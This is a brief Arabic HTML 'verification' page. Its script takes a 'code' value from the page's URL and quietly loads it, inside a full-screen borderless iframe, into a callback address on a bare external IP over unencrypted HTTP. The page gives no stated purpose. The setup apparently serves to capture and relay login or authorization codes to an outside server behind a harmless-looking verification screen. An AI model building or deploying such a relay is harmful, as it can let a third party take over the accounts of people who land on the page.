<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>عرض صفحة التحقق</title>
  <style>
    body, html {
      margin: 0; 
      padding: 0; 
      height: 100%;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f0f0;
    }
    iframe {
      width: 100%;
      height: 100vh;
      border: none;
    }
    h1 {
      color: #333;
    }
  </style>
</head>
<body>

  <iframe></iframe>

  <script>
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    const iframe = document.querySelector('iframe');

    if (code) {
      iframe.src = `http://45.86.155.150:6300/callback?code=${encodeURIComponent(code)}`;
    } else {
      document.body.innerHTML = "<h1>لا يوجد كود للتحقق!</h1>";
    }
  </script>

</body>
</html>
